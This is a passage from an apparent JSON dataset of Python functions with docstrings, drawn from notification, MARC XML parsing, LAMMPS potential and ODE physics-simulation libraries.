            "def find(self, *args):\n        \"\"\"\n        Find a node in the tree. If the node is not found it is added first and then returned.\n\n        :param args: a tuple\n        :return: returns the node\n        \"\"\"\n        curr_node = self.__root\n        return self.__traverse(curr_node, 0,  *args)"
        ],
        [
            "def get_notification_language(user):\n    \"\"\"\n    Returns site-specific notification language for this user. Raises\n    LanguageStoreNotAvailable if this site does not use translated\n    notifications.\n    \"\"\"\n    if getattr(settings, \"NOTIFICATION_LANGUAGE_MODULE\", False):\n        try:\n            app_label, model_name = settings.NOTIFICATION_LANGUAGE_MODULE.split(\".\")\n            model = models.get_model(app_label, model_name)\n            # pylint: disable-msg=W0212\n            language_model = model._default_manager.get(user__id__exact=user.id)\n            if hasattr(language_model, \"language\"):\n                return language_model.language\n        except (ImportError, ImproperlyConfigured, model.DoesNotExist):\n            raise LanguageStoreNotAvailable\n    raise LanguageStoreNotAvailable"
        ],
        [
            "def send_now(users, label, extra_context=None, sender=None):\n    \"\"\"\n    Creates a new notice.\n\n    This is intended to be how other apps create new notices.\n\n    notification.send(user, \"friends_invite_sent\", {\n        \"spam\": \"eggs\",\n        \"foo\": \"bar\",\n    )\n    \"\"\"\n    sent = False\n    if extra_context is None:\n        extra_context = {}\n\n    notice_type = NoticeType.objects.get(label=label)\n\n    current_language = get_language()\n\n    for user in users:\n        # get user language for user from language store defined in\n        # NOTIFICATION_LANGUAGE_MODULE setting\n        try:\n            language = get_notification_language(user)\n        except LanguageStoreNotAvailable:\n            language = None\n\n        if language is not None:\n            # activate the user's language\n            activate(language)\n\n        for backend in NOTIFICATION_BACKENDS.values():\n            if backend.can_send(user, notice_type):\n                backend.deliver(user, sender, notice_type, extra_context)\n                sent = True\n\n    # reset environment to original language\n    activate(current_language)\n    return sent"
        ],
        [
            "def send(*args, **kwargs):\n    \"\"\"\n    A basic interface around both queue and send_now. This honors a global\n    flag NOTIFICATION_QUEUE_ALL that helps determine whether all calls should\n    be queued or not. A per call ``queue`` or ``now`` keyword argument can be\n    used to always override the default global behavior.\n    \"\"\"\n    queue_flag = kwargs.pop(\"queue\", False)\n    now_flag = kwargs.pop(\"now\", False)\n    assert not (queue_flag and now_flag), \"'queue' and 'now' cannot both be True.\"\n    if queue_flag:\n        return queue(*args, **kwargs)\n    elif now_flag:\n        return send_now(*args, **kwargs)\n    else:\n        if QUEUE_ALL:\n            return queue(*args, **kwargs)\n        else:\n            return send_now(*args, **kwargs)"
        ],
        [
            "def queue(users, label, extra_context=None, sender=None):\n    \"\"\"\n    Queue the notification in NoticeQueueBatch. This allows for large amounts\n    of user notifications to be deferred to a seperate process running outside\n    the webserver.\n    \"\"\"\n    if extra_context is None:\n        extra_context = {}\n    if isinstance(users, QuerySet):\n        users = [row[\"pk\"] for row in users.values(\"pk\")]\n    else:\n        users = [user.pk for user in users]\n    notices = []\n    for user in users:\n        notices.append((user, label, extra_context, sender))\n    NoticeQueueBatch(pickled_data=base64.b64encode(pickle.dumps(notices))).save()"
        ],
        [
            "def write_table_pair_potential(func, dfunc=None, bounds=(1.0, 10.0), samples=1000, tollerance=1e-6, keyword='PAIR'):\n    \"\"\"A helper function to write lammps pair potentials to string. Assumes that\n    functions are vectorized.\n\n    Parameters\n    ----------\n    func: function\n       A function that will be evaluated for the force at each radius. Required to\n       be numpy vectorizable.\n    dfunc: function\n       Optional. A function that will be evaluated for the energy at each\n       radius. If not supplied the centered difference method will be\n       used. Required to be numpy vectorizable.\n    bounds: tuple, list\n       Optional. specifies min and max radius to evaluate the\n       potential. Default 1 length unit, 10 length unit.\n    samples: int\n       Number of points to evaluate potential. Default 1000. Note that\n       a low number of sample points will reduce accuracy.\n    tollerance: float\n       Value used to centered difference differentiation.\n    keyword: string\n       Lammps keyword to use to pair potential. This keyword will need\n       to be used in the lammps pair_coeff. Default ``PAIR``\n    filename: string\n       Optional. filename to write lammps table potential as. Default\n       ``lammps.table`` it is highly recomended to change the value.\n\n    A file for each unique pair potential is required.\n    \"\"\"\n    r_min, r_max = bounds\n    if dfunc is None:\n        dfunc = lambda r: (func(r+tollerance) - func(r-tollerance)) / (2*tollerance)\n\n    i = np.arange(1, samples+1)\n    r = np.linspace(r_min, r_max, samples)\n    forces = func(r)\n    energies = dfunc(r)\n    lines = ['%d %f %f %f\\n' % (index, radius, force, energy) for index, radius, force, energy in zip(i, r, forces, energies)]\n    return \"%s\\nN %d\\n\\n\" % (keyword, samples) + ''.join(lines)"
        ],
        [
            "def write_tersoff_potential(parameters):\n    \"\"\"Write tersoff potential file from parameters to string\n\n    Parameters\n    ----------\n    parameters: dict\n       keys are tuple of elements with the values being the parameters length 14\n    \"\"\"\n    lines = []\n    for (e1, e2, e3), params in parameters.items():\n        if len(params) != 14:\n            raise ValueError('tersoff three body potential expects 14 parameters')\n        lines.append(' '.join([e1, e2, e3] + ['{:16.8g}'.format(_) for _ in params]))\n    return '\\n'.join(lines)"
        ],
        [
            "def aggregate(self, clazz, new_col, *args):\n        \"\"\"\n        Aggregate the rows of each group into a single value.\n\n        :param clazz: name of a class that extends class Callable\n        :type clazz: class\n        :param new_col: name of the new column\n        :type new_col: str\n        :param args: list of column names of the object that\n         function should be applied to\n        :type args: varargs\n        :return: returns a new dataframe object with the aggregated value\n        :rtype: DataFrame\n        \"\"\"\n        if is_callable(clazz) \\\n                and not is_none(new_col) \\\n                and has_elements(*args) \\\n                and is_disjoint(self.__grouping.grouping_colnames,\n                                args,\n                                __DISJOINT_SETS_ERROR__):\n            return self.__do_aggregate(clazz, new_col, *args)"
        ],
        [
            "def is_disjoint(set1, set2, warn):\n    \"\"\"\n    Checks if elements of set2 are in set1.\n\n    :param set1: a set of values\n    :param set2: a set of values\n    :param warn: the error message that should be thrown\n     when the sets are NOT disjoint\n    :return: returns true no elements of set2 are in set1\n    \"\"\"\n    for elem in set2:\n        if elem in set1:\n            raise ValueError(warn)\n    return True"
        ],
        [
            "def contains_all(set1, set2, warn):\n    \"\"\"\n    Checks if all elements from set2 are in set1.\n\n    :param set1:  a set of values\n    :param set2:  a set of values\n    :param warn: the error message that should be thrown \n     when the sets are not containd\n    :return: returns true if all values of set2 are in set1\n    \"\"\"\n    for elem in set2:\n        if elem not in set1:\n            raise ValueError(warn)\n    return True"
        ],
        [
            "def to_XML(self):\n        \"\"\"\n        Serialize object back to XML string.\n\n        Returns:\n            str: String which should be same as original input, if everything\\\n                 works as expected.\n        \"\"\"\n        marcxml_template = \"\"\"<record xmlns=\"http://www.loc.gov/MARC21/slim/\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://www.loc.gov/MARC21/slim\nhttp://www.loc.gov/standards/marcxml/schema/MARC21slim.xsd\">\n$LEADER\n$CONTROL_FIELDS\n$DATA_FIELDS\n</record>\n\"\"\"\n\n        oai_template = \"\"\"<record>\n<metadata>\n<oai_marc>\n$LEADER$CONTROL_FIELDS\n$DATA_FIELDS\n</oai_marc>\n</metadata>\n</record>\n\"\"\"\n\n        # serialize leader, if it is present and record is marc xml\n        leader = self.leader if self.leader is not None else \"\"\n        if leader:  # print only visible leaders\n            leader = \"<leader>\" + leader + \"</leader>\"\n\n        # discard leader for oai\n        if self.oai_marc:\n            leader = \"\"\n\n        # serialize\n        xml_template = oai_template if self.oai_marc else marcxml_template\n        xml_output = Template(xml_template).substitute(\n            LEADER=leader.strip(),\n            CONTROL_FIELDS=self._serialize_ctl_fields().strip(),\n            DATA_FIELDS=self._serialize_data_fields().strip()\n        )\n\n        return xml_output"
        ],
        [
            "def _parse_string(self, xml):\n        \"\"\"\n        Parse MARC XML document to dicts, which are contained in\n        self.controlfields and self.datafields.\n\n        Args:\n            xml (str or HTMLElement): input data\n\n        Also detect if this is oai marc format or not (see elf.oai_marc).\n        \"\"\"\n        if not isinstance(xml, HTMLElement):\n            xml = dhtmlparser.parseString(str(xml))\n\n        # check if there are any records\n        record = xml.find(\"record\")\n        if not record:\n            raise ValueError(\"There is no <record> in your MARC XML document!\")\n        record = record[0]\n\n        self.oai_marc = len(record.find(\"oai_marc\")) > 0\n\n        # leader is separate only in marc21\n        if not self.oai_marc:\n            leader = record.find(\"leader\")\n            if len(leader) >= 1:\n                self.leader = leader[0].getContent()\n\n        # parse body in respect of OAI MARC format possibility\n        if self.oai_marc:\n            self._parse_control_fields(record.find(\"fixfield\"), \"id\")\n            self._parse_data_fields(record.find(\"varfield\"), \"id\", \"label\")\n        else:\n            self._parse_control_fields(record.find(\"controlfield\"), \"tag\")\n            self._parse_data_fields(record.find(\"datafield\"), \"tag\", \"code\")\n\n        # for backward compatibility of MARC XML with OAI\n        if self.oai_marc and \"LDR\" in self.controlfields:\n            self.leader = self.controlfields[\"LDR\"]"
        ],
        [
            "def _parse_control_fields(self, fields, tag_id=\"tag\"):\n        \"\"\"\n        Parse control fields.\n\n        Args:\n            fields (list): list of HTMLElements\n            tag_id (str):  parameter name, which holds the information, about\n                           field name this is normally \"tag\", but in case of\n                           oai_marc \"id\".\n        \"\"\"\n        for field in fields:\n            params = field.params\n\n            # skip tags without parameters\n            if tag_id not in params:\n                continue\n\n            self.controlfields[params[tag_id]] = field.getContent().strip()"
        ],
        [
            "def _parse_data_fields(self, fields, tag_id=\"tag\", sub_id=\"code\"):\n        \"\"\"\n        Parse data fields.\n\n        Args:\n            fields (list): of HTMLElements\n            tag_id (str): parameter name, which holds the information, about\n                          field name this is normally \"tag\", but in case of\n                          oai_marc \"id\"\n            sub_id (str): id of parameter, which holds informations about\n                          subfield name this is normally \"code\" but in case of\n                          oai_marc \"label\"\n\n        \"\"\"\n        for field in fields:\n            params = field.params\n\n            if tag_id not in params:\n                continue\n\n            # take care of iX/indX (indicator) parameters\n            field_repr = OrderedDict([\n                [self.i1_name, params.get(self.i1_name, \" \")],\n                [self.i2_name, params.get(self.i2_name, \" \")],\n            ])\n\n            # process all subfields\n            for subfield in field.find(\"subfield\"):\n                if sub_id not in subfield.params:\n                    continue\n\n                content = MARCSubrecord(\n                    val=subfield.getContent().strip(),\n                    i1=field_repr[self.i1_name],\n                    i2=field_repr[self.i2_name],\n                    other_subfields=field_repr\n                )\n\n                # add or append content to list of other contents\n                code = subfield.params[sub_id]\n                if code in field_repr:\n                    field_repr[code].append(content)\n                else:\n                    field_repr[code] = [content]\n\n            tag = params[tag_id]\n            if tag in self.datafields:\n                self.datafields[tag].append(field_repr)\n            else:\n                self.datafields[tag] = [field_repr]"
        ],
        [
            "def get_i_name(self, num, is_oai=None):\n        \"\"\"\n        This method is used mainly internally, but it can be handy if you work\n        with with raw MARC XML object and not using getters.\n\n        Args:\n            num (int): Which indicator you need (1/2).\n            is_oai (bool/None): If None, :attr:`.oai_marc` is\n                   used.\n\n        Returns:\n            str: current name of ``i1``/``ind1`` parameter based on \\\n                 :attr:`oai_marc` property.\n        \"\"\"\n        if num not in (1, 2):\n            raise ValueError(\"`num` parameter have to be 1 or 2!\")\n\n        if is_oai is None:\n            is_oai = self.oai_marc\n\n        i_name = \"ind\" if not is_oai else \"i\"\n\n        return i_name + str(num)"
        ],
        [
            "def get_subfields(self, datafield, subfield, i1=None, i2=None,\n                      exception=False):\n        \"\"\"\n        Return content of given `subfield` in `datafield`.\n\n        Args:\n            datafield (str): Section name (for example \"001\", \"100\", \"700\").\n            subfield (str):  Subfield name (for example \"a\", \"1\", etc..).\n            i1 (str, default None): Optional i1/ind1 parameter value, which\n               will be used for search.\n            i2 (str, default None): Optional i2/ind2 parameter value, which\n               will be used for search.\n            exception (bool): If ``True``, :exc:`~exceptions.KeyError` is\n                      raised when method couldn't found given `datafield` /\n                      `subfield`. If ``False``, blank array ``[]`` is returned.\n\n        Returns:\n            list: of :class:`.MARCSubrecord`.\n\n        Raises:\n            KeyError: If the subfield or datafield couldn't be found.\n\n        Note:\n            MARCSubrecord is practically same thing as string, but has defined\n            :meth:`.MARCSubrecord.i1` and :attr:`.MARCSubrecord.i2`\n            methods.\n\n            You may need to be able to get this, because MARC XML depends on\n            i/ind parameters from time to time (names of authors for example).\n\n        \"\"\"\n        if len(datafield) != 3:\n            raise ValueError(\n                \"`datafield` parameter have to be exactly 3 chars long!\"\n            )\n        if len(subfield) != 1:\n            raise ValueError(\n                \"Bad subfield specification - subfield have to be 1 char long!\"\n            )\n\n        # if datafield not found, return or raise exception\n        if datafield not in self.datafields:\n            if exception:\n                raise KeyError(datafield + \" is not in datafields!\")\n\n            return []\n\n        # look for subfield defined by `subfield`, `i1` and `i2` parameters\n        output = []\n        for datafield in self.datafields[datafield]:\n            if subfield not in datafield:\n                continue\n\n            # records are not returned just like plain string, but like\n            # MARCSubrecord, because you will need ind1/ind2 values\n            for sfield in datafield[subfield]:\n                if i1 and sfield.i1 != i1:\n                    continue\n\n                if i2 and sfield.i2 != i2:\n                    continue\n\n                output.append(sfield)\n\n        if not output and exception:\n            raise KeyError(subfield + \" couldn't be found in subfields!\")\n\n        return output"
        ],
        [
            "def _get_params(target, param, dof):\n    '''Get the given param from each of the DOFs for a joint.'''\n    return [target.getParam(getattr(ode, 'Param{}{}'.format(param, s)))\n            for s in ['', '2', '3'][:dof]]"
        ],
        [
            "def _set_params(target, param, values, dof):\n    '''Set the given param for each of the DOFs for a joint.'''\n    if not isinstance(values, (list, tuple, np.ndarray)):\n        values = [values] * dof\n    assert dof == len(values)\n    for s, value in zip(['', '2', '3'][:dof], values):\n        target.setParam(getattr(ode, 'Param{}{}'.format(param, s)), value)"
        ],
        [
            "def make_quaternion(theta, *axis):\n    '''Given an angle and an axis, create a quaternion.'''\n    x, y, z = axis\n    r = np.sqrt(x * x + y * y + z * z)\n    st = np.sin(theta / 2.)\n    ct = np.cos(theta / 2.)\n    return [x * st / r, y * st / r, z * st / r, ct]"
        ],
        [
            "def center_of_mass(bodies):\n    '''Given a set of bodies, compute their center of mass in world coordinates.\n    '''\n    x = np.zeros(3.)\n    t = 0.\n    for b in bodies:\n        m = b.mass\n        x += b.body_to_world(m.c) * m.mass\n        t += m.mass\n    return x / t"
        ],
        [
            "def state(self, state):\n        '''Set the state of this body.\n\n        Parameters\n        ----------\n        state : BodyState tuple\n            The desired state of the body.\n        '''\n        assert self.name == state.name, \\\n            'state name \"{}\" != body name \"{}\"'.format(state.name, self.name)\n        self.position = state.position\n        self.quaternion = state.quaternion\n        self.linear_velocity = state.linear_velocity\n        self.angular_velocity = state.angular_velocity"
        ],
        [
            "def rotation(self, rotation):\n        '''Set the rotation of this body using a rotation matrix.\n\n        Parameters\n        ----------\n        rotation : sequence of 9 floats\n            The desired rotation matrix for this body.\n        '''\n        if isinstance(rotation, np.ndarray):\n            rotation = rotation.ravel()\n        self.ode_body.setRotation(tuple(rotation))"
        ],
        [
            "def body_to_world(self, position):\n        '''Convert a body-relative offset to world coordinates.\n\n        Parameters\n        ----------\n        position : 3-tuple of float\n            A tuple giving body-relative offsets.\n\n        Returns\n        -------\n        position : 3-tuple of float\n            A tuple giving the world coordinates of the given offset.\n        '''\n        return np.array(self.ode_body.getRelPointPos(tuple(position)))"
        ],
        [
            "def world_to_body(self, position):\n        '''Convert a point in world coordinates to a body-relative offset.\n\n        Parameters\n        ----------\n        position : 3-tuple of float\n            A world coordinates position.\n\n        Returns\n        -------\n        offset : 3-tuple of float\n            A tuple giving the body-relative offset of the given position.\n        '''\n        return np.array(self.ode_body.getPosRelPoint(tuple(position)))"
        ],
        [
            "def relative_offset_to_world(self, offset):\n        '''Convert a relative body offset to world coordinates.\n\n        Parameters\n        ----------\n        offset : 3-tuple of float\n            The offset of the desired point, given as a relative fraction of the\n            size of this body. For example, offset (0, 0, 0) is the center of\n            the body, while (0.5, -0.2, 0.1) describes a point halfway from the\n            center towards the maximum x-extent of the body, 20% of the way from\n            the center towards the minimum y-extent, and 10% of the way from the\n            center towards the maximum z-extent.\n\n        Returns\n        -------\n        position : 3-tuple of float\n            A position in world coordinates of the given body offset.\n        '''\n        return np.array(self.body_to_world(offset * self.dimensions / 2))"
        ],
        [
            "def add_force(self, force, relative=False, position=None, relative_position=None):\n        '''Add a force to this body.\n\n        Parameters\n        ----------\n        force : 3-tuple of float\n            A vector giving the forces along each world or body coordinate axis.\n        relative : bool, optional\n            If False, the force values are assumed to be given in the world\n            coordinate frame. If True, they are assumed to be given in the\n            body-relative coordinate frame. Defaults to False.\n        position : 3-tuple of float, optional\n            If given, apply the force at this location in world coordinates.\n            Defaults to the current position of the body.\n        relative_position : 3-tuple of float, optional\n            If given, apply the force at this relative location on the body. If\n            given, this method ignores the ``position`` parameter.\n        '''\n        b = self.ode_body\n        if relative_position is not None:\n            op = b.addRelForceAtRelPos if relative else b.addForceAtRelPos\n            op(force, relative_position)\n        elif position is not None:\n            op = b.addRelForceAtPos if relative else b.addForceAtPos\n            op(force, position)\n        else:\n            op = b.addRelForce if relative else b.addForce\n            op(force)"
        ],
        [
            "def add_torque(self, torque, relative=False):\n        '''Add a torque to this body.\n\n        Parameters\n        ----------\n        force : 3-tuple of float\n            A vector giving the torque along each world or body coordinate axis.\n        relative : bool, optional\n            If False, the torque values are assumed to be given in the world\n            coordinate frame. If True, they are assumed to be given in the\n            body-relative coordinate frame. Defaults to False.\n        '''\n        op = self.ode_body.addRelTorque if relative else self.ode_body.addTorque\n        op(torque)"
        ],
        [
            "def join_to(self, joint, other_body=None, **kwargs):\n        '''Connect this body to another one using a joint.\n\n        This method creates a joint to fasten this body to the other one. See\n        :func:`World.join`.\n\n        Parameters\n        ----------\n        joint : str\n            The type of joint to use when connecting these bodies.\n        other_body : :class:`Body` or str, optional\n            The other body to join with this one. If not given, connects this\n            body to the world.\n        '''\n        self.world.join(joint, self, other_body, **kwargs)"
        ],
        [
            "def connect_to(self, joint, other_body, offset=(0, 0, 0), other_offset=(0, 0, 0),\n                   **kwargs):\n        '''Move another body next to this one and join them together.\n\n        This method will move the ``other_body`` so that the anchor points for\n        the joint coincide. It then creates a joint to fasten the two bodies\n        together. See :func:`World.move_next_to` and :func:`World.join`.\n\n        Parameters\n        ----------\n        joint : str\n            The type of joint to use when connecting these bodies.\n        other_body : :class:`Body` or str\n            The other body to join with this one.\n        offset : 3-tuple of float, optional\n            The body-relative offset where the anchor for the joint should be\n            placed. Defaults to (0, 0, 0). See :func:`World.move_next_to` for a\n            description of how offsets are specified.\n        other_offset : 3-tuple of float, optional\n            The offset on the second body where the joint anchor should be\n            placed. Defaults to (0, 0, 0). Like ``offset``, this is given as an\n            offset relative to the size and shape of ``other_body``.\n        '''\n        anchor = self.world.move_next_to(self, other_body, offset, other_offset)\n        self.world.join(joint, self, other_body, anchor=anchor, **kwargs)"
        ],
        [
            "def positions(self):\n        '''List of positions for linear degrees of freedom.'''\n        return [self.ode_obj.getPosition(i) for i in range(self.LDOF)]"
        ],
        [
            "def position_rates(self):\n        '''List of position rates for linear degrees of freedom.'''\n        return [self.ode_obj.getPositionRate(i) for i in range(self.LDOF)]"
        ],
        [
            "def angles(self):\n        '''List of angles for rotational degrees of freedom.'''\n        return [self.ode_obj.getAngle(i) for i in range(self.ADOF)]"
        ],
        [
            "def angle_rates(self):\n        '''List of angle rates for rotational degrees of freedom.'''\n        return [self.ode_obj.getAngleRate(i) for i in range(self.ADOF)]"
        ],
        [
            "def axes(self):\n        '''List of axes for this object's degrees of freedom.'''\n        return [np.array(self.ode_obj.getAxis(i))\n                for i in range(self.ADOF or self.LDOF)]"
        ],
        [
            "def lo_stops(self, lo_stops):\n        '''Set the lo stop values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        lo_stops : float or sequence of float\n            A lo stop value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians.\n        '''\n        _set_params(self.ode_obj, 'LoStop', lo_stops, self.ADOF + self.LDOF)"
        ],
        [
            "def hi_stops(self, hi_stops):\n        '''Set the hi stop values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        hi_stops : float or sequence of float\n            A hi stop value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians.\n        '''\n        _set_params(self.ode_obj, 'HiStop', hi_stops, self.ADOF + self.LDOF)"
        ],
        [
            "def velocities(self, velocities):\n        '''Set the target velocities for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        velocities : float or sequence of float\n            A target velocity value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians / second.\n        '''\n        _set_params(self.ode_obj, 'Vel', velocities, self.ADOF + self.LDOF)"
        ],
        [
            "def max_forces(self, max_forces):\n        '''Set the maximum forces for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        max_forces : float or sequence of float\n            A maximum force value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        '''\n        _set_params(self.ode_obj, 'FMax', max_forces, self.ADOF + self.LDOF)"
        ],
        [
            "def erps(self, erps):\n        '''Set the ERP values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        erps : float or sequence of float\n            An ERP value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        '''\n        _set_params(self.ode_obj, 'ERP', erps, self.ADOF + self.LDOF)"
        ],
        [
            "def cfms(self, cfms):\n        '''Set the CFM values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        cfms : float or sequence of float\n            A CFM value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        '''\n        _set_params(self.ode_obj, 'CFM', cfms, self.ADOF + self.LDOF)"
        ],
        [
            "def stop_cfms(self, stop_cfms):\n        '''Set the CFM values for this object's DOF limits.\n\n        Parameters\n        ----------\n        stop_cfms : float or sequence of float\n            A CFM value to set on all degrees of freedom limits, or a list\n            containing one such value for each degree of freedom limit.\n        '''\n        _set_params(self.ode_obj, 'StopCFM', stop_cfms, self.ADOF + self.LDOF)"
        ],
        [
            "def stop_erps(self, stop_erps):\n        '''Set the ERP values for this object's DOF limits.\n\n        Parameters\n        ----------\n        stop_erps : float or sequence of float\n            An ERP value to set on all degrees of freedom limits, or a list\n            containing one such value for each degree of freedom limit.\n        '''\n        _set_params(self.ode_obj, 'StopERP', stop_erps, self.ADOF + self.LDOF)"
        ],
        [
            "def axes(self, axes):\n        '''Set the linear axis of displacement for this joint.\n\n        Parameters\n        ----------\n        axes : list containing one 3-tuple of floats\n            A list of the axes for this joint. For a slider joint, which has one\n            degree of freedom, this must contain one 3-tuple specifying the X,\n            Y, and Z axis for the joint.\n        '''\n        self.lmotor.axes = [axes[0]]\n        self.ode_obj.setAxis(tuple(axes[0]))"
        ],
        [
            "def axes(self, axes):\n        '''Set the angular axis of rotation for this joint.\n\n        Parameters\n        ----------\n        axes : list containing one 3-tuple of floats\n            A list of the axes for this joint. For a hinge joint, which has one\n            degree of freedom, this must contain one 3-tuple specifying the X,\n            Y, and Z axis for the joint.\n        '''\n        self.amotor.axes = [axes[0]]\n        self.ode_obj.setAxis(tuple(axes[0]))"
        ],
        [
            "def axes(self):\n        '''A list of axes of rotation for this joint.'''\n        return [np.array(self.ode_obj.getAxis1()),\n                np.array(self.ode_obj.getAxis2())]"
        ],
        [
            "def create_body(self, shape, name=None, **kwargs):\n        '''Create a new body.\n\n        Parameters\n        ----------\n        shape : str\n            The \"shape\" of the body to be created. This should name a type of\n            body object, e.g., \"box\" or \"cap\".\n        name : str, optional\n            The name to use for this body. If not given, a default name will be\n            constructed of the form \"{shape}{# of objects in the world}\".\n\n        Returns\n        -------\n        body : :class:`Body`\n            The created body object.\n        '''\n        shape = shape.lower()\n        if name is None:\n            for i in range(1 + len(self._bodies)):\n                name = '{}{}'.format(shape, i)\n                if name not in self._bodies:\n                    break\n        self._bodies[name] = Body.build(shape, name, self, **kwargs)\n        return self._bodies[name]"
        ],
        [
            "def join(self, shape, body_a, body_b=None, name=None, **kwargs):\n        '''Create a new joint that connects two bodies together.\n\n        Parameters\n        ----------\n        shape : str\n            The \"shape\" of the joint to use for joining together two bodies.\n            This should name a type of joint, such as \"ball\" or \"piston\".\n        body_a : str or :class:`Body`\n            The first body to join together with this joint. If a string is\n            given, it will be used as the name of a body to look up in the\n            world.\n        body_b : str or :class:`Body`, optional\n            If given, identifies the second body to join together with\n            ``body_a``. If not given, ``body_a`` is joined to the world.\n        name : str, optional\n            If given, use this name for the created joint. If not given, a name\n            will be constructed of the form\n            \"{body_a.name}^{shape}^{body_b.name}\".\n\n        Returns\n        -------\n        joint : :class:`Joint`\n            The joint object that was created.\n        '''\n        ba = self.get_body(body_a)\n        bb = self.get_body(body_b)\n        shape = shape.lower()\n        if name is None:\n            name = '{}^{}^{}'.format(ba.name, shape, bb.name if bb else '')\n        self._joints[name] = Joint.build(\n            shape, name, self, body_a=ba, body_b=bb, **kwargs)\n        return self._joints[name]"
        ],
        [
            "def move_next_to(self, body_a, body_b, offset_a, offset_b):\n        '''Move one body to be near another one.\n\n        After moving, the location described by ``offset_a`` on ``body_a`` will\n        be coincident with the location described by ``offset_b`` on ``body_b``.\n\n        Parameters\n        ----------\n        body_a : str or :class:`Body`\n            The body to use as a reference for moving the other body. If this is\n            a string, it is treated as the name of a body to look up in the\n            world.\n        body_b : str or :class:`Body`\n            The body to move next to ``body_a``. If this is a string, it is\n            treated as the name of a body to look up in the world.\n        offset_a : 3-tuple of float\n            The offset of the anchor point, given as a relative fraction of the\n            size of ``body_a``. See :func:`Body.relative_offset_to_world`.\n        offset_b : 3-tuple of float\n            The offset of the anchor point, given as a relative fraction of the\n            size of ``body_b``.\n\n        Returns\n        -------\n        anchor : 3-tuple of float\n            The location of the shared point, which is often useful to use as a\n            joint anchor.\n        '''\n        ba = self.get_body(body_a)\n        bb = self.get_body(body_b)\n        if ba is None:\n            return bb.relative_offset_to_world(offset_b)\n        if bb is None:\n            return ba.relative_offset_to_world(offset_a)\n        anchor = ba.relative_offset_to_world(offset_a)\n        offset = bb.relative_offset_to_world(offset_b)\n        bb.position = bb.position + anchor - offset\n        return anchor"
        ],
        [
            "def set_body_states(self, states):\n        '''Set the states of some bodies in the world.\n\n        Parameters\n        ----------\n        states : sequence of states\n            A complete state tuple for one or more bodies in the world. See\n            :func:`get_body_states`.\n        '''\n        for state in states:\n            self.get_body(state.name).state = state"
        ],
        [
            "def step(self, substeps=2):\n        '''Step the world forward by one frame.\n\n        Parameters\n        ----------\n        substeps : int, optional\n            Split the step into this many sub-steps. This helps to prevent the\n            time delta for an update from being too large.\n        '''\n        self.frame_no += 1\n        dt = self.dt / substeps\n        for _ in range(substeps):\n            self.ode_contactgroup.empty()\n            self.ode_space.collide(None, self.on_collision)\n            self.ode_world.step(dt)"
        ],
        [
            "def are_connected(self, body_a, body_b):\n        '''Determine whether the given bodies are currently connected.\n\n        Parameters\n        ----------\n        body_a : str or :class:`Body`\n            One body to test for connectedness. If this is a string, it is\n            treated as the name of a body to look up.\n        body_b : str or :class:`Body`\n            One body to test for connectedness. If this is a string, it is\n            treated as the name of a body to look up.\n\n        Returns\n        -------\n        connected : bool\n            Return True iff the two bodies are connected.\n        '''\n        return bool(ode.areConnected(\n            self.get_body(body_a).ode_body,\n            self.get_body(body_b).ode_body))"
        ],
        [
            "def parse_amc(source):\n    '''Parse an AMC motion capture data file.\n\n    Parameters\n    ----------\n    source : file\n        A file-like object that contains AMC motion capture text.\n\n    Yields\n    ------\n    frame : dict\n        Yields a series of motion capture frames. Each frame is a dictionary\n        that maps a bone name to a list of the DOF configurations for that bone.\n    '''\n    lines = 0\n    frames = 1\n    frame = {}\n    degrees = False\n    for line in source:\n        lines += 1\n        line = line.split('#')[0].strip()\n        if not line:\n            continue\n        if line.startswith(':'):\n            if line.lower().startswith(':deg'):\n                degrees = True\n            continue\n        if line.isdigit():\n            if int(line) != frames:\n                raise RuntimeError(\n                    'frame mismatch on line {}: '\n                    'produced {} but file claims {}'.format(lines, frames, line))\n            yield frame\n            frames += 1\n            frame = {}\n            continue\n        fields = line.split()\n        frame[fields[0]] = list(map(float, fields[1:]))"
        ],
        [
            "def create_bodies(self, translate=(0, 1, 0), size=0.1):\n        '''Traverse the bone hierarchy and create physics bodies.'''\n        stack = [('root', 0, self.root['position'] + translate)]\n        while stack:\n            name, depth, end = stack.pop()\n\n            for child in self.hierarchy.get(name, ()):\n                stack.append((child, depth + 1, end + self.bones[child].end))\n\n            if name not in self.bones:\n                continue\n\n            bone = self.bones[name]\n            body = self.world.create_body(\n                'box', name=bone.name, density=self.density,\n                lengths=(size, size, bone.length))\n            body.color = self.color\n\n            # move the center of the body to the halfway point between\n            # the parent (joint) and child (joint).\n            x, y, z = end - bone.direction * bone.length / 2\n\n            # swizzle y and z -- asf uses y as up, but we use z as up.\n            body.position = x, z, y\n\n            # compute an orthonormal (rotation) matrix using the ground and\n            # the body. this is mind-bending but seems to work.\n            u = bone.direction\n            v = np.cross(u, [0, 1, 0])\n            l = np.linalg.norm(v)\n            if l > 0:\n                v /= l\n                rot = np.vstack([np.cross(u, v), v, u]).T\n                swizzle = [[1, 0, 0], [0, 0, 1], [0, -1, 0]]\n                body.rotation = np.dot(swizzle, rot)\n\n            self.bodies.append(body)"
        ],
        [
            "def create_joints(self):\n        '''Traverse the bone hierarchy and create physics joints.'''\n        stack = ['root']\n        while stack:\n            parent = stack.pop()\n            for child in self.hierarchy.get(parent, ()):\n                stack.append(child)\n            if parent not in self.bones:\n                continue\n            bone = self.bones[parent]\n            body = [b for b in self.bodies if b.name == parent][0]\n            for child in self.hierarchy.get(parent, ()):\n                child_bone = self.bones[child]\n                child_body = [b for b in self.bodies if b.name == child][0]\n                shape = ('', 'hinge', 'universal', 'ball')[len(child_bone.dof)]\n                self.joints.append(self.world.join(shape, body, child_body))"
        ],
        [
